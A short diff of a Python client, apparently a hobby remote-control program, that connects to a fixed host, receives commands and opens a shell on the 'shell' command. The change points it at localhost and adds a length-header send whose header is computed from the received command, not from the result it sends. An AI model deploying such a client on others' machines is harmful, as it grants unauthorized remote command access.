@@ -6,7 +6,7 @@ from tkinter import messagebox
 from tkinter import *
 
 # -------------- Constantes --------------
-HOST_IP = "192.168.1.19"
+HOST_IP = "127.0.0.1"
 HOST_PORT = 3500
 MAX_DATA_SIZE = 4000
 
@@ -69,7 +69,11 @@ while True:
 		break
 
 	print("Commande : ", data)
- 
+	
+	header = str(len(data.encode('ascii', errors='ignore'))).zfill(13)
+	s.sendall(header.encode('ascii', errors='ignore'))
+	s.sendall(resultat.encode('ascii', errors='ignore'))
+
 	if data == "shell":
 		shell_client()
 		continue
@@ -78,7 +82,7 @@ while True:
 		msg(command_split[1])
 		
   		
-		
+
 
 
 s.close()
